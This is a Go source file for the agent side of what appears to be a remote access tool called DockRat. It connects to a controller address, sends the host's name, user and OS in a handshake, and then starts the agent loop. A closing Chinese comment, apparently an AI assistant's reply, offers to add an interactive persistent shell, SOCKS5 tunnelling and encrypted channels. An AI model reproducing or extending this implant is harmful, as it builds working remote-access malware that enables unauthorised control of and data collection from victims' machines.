

package main

import (
	"encoding/json"
	"log"
	"net"
	"os"
	"runtime"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/network"
)

type HandshakePayload struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	ParentID int   `json:"parent_id"` 
}

func main() {
	adminAddr := "127.0.0.1:9999"
	conn, err := net.Dial("tcp", adminAddr)
	if err != nil {
		log.Fatalf("[-] Failed to connect to admin: %v", err)
	}
	log.Println("[+] Connected to admin!")

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payload := HandshakePayload{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		ParentID: -1, //初始为 -1，表示没有父节点
	}
	payloadBytes, _ := json.Marshal(payload)

	msg := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: payloadBytes,
	}

	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Fatalf("[-] Failed to encode message: %v", err)
	}

	_, err = conn.Write(data)
	if err != nil {
		log.Fatalf("[-] Failed to send message: %v", err)
	}

	log.Println("[+] Handshake message sent")

	network.StartAgent(conn)
}


/*是否继续实现：

    🐚 持久化 shell 模式（交互式 stdin/stdout）

    🛰️ socks5 转发或端口映射

    🔐 TLS/AES 加密通信层

你可以指定想优先开发的子模块。 */
